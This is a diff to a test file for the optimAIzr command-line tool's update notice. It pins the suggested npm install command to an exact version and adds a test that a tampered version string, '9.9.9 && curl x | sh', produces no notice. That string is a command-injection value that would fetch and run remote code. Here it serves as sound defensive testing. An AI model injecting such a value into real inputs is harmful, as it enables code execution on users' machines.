@@ -56,7 +56,14 @@ test("a newer release is announced at most once a day", () => {
   const state = { seenVersion: "0.9.0", latest: "0.9.1" };
   const lines = strip(updateLines(state, NOW, { version: "0.9.0" }).join("\n"));
   assert.match(lines, /optimAIzr 0\.9\.1 is available · you have 0\.9\.0/);
-  assert.match(lines, /npm i -g optimaizr@latest/);
+  // An exact version, so what gets installed is what was announced.
+  assert.match(lines, /npm i -g optimaizr@0\.9\.1 /);
+  assert.deepEqual(
+    updateLines({ seenVersion: "0.9.0", latest: "9.9.9 && curl x | sh" }, NOW, {
+      version: "0.9.0",
+    }),
+    [],
+  );
   const told = { ...state, noticedAt: new Date(NOW - 3_600_000).toISOString() };
   assert.deepEqual(updateLines(told, NOW, { version: "0.9.0" }), []);
   const yesterday = { ...state, noticedAt: new Date(NOW - 25 * 3_600_000).toISOString() };
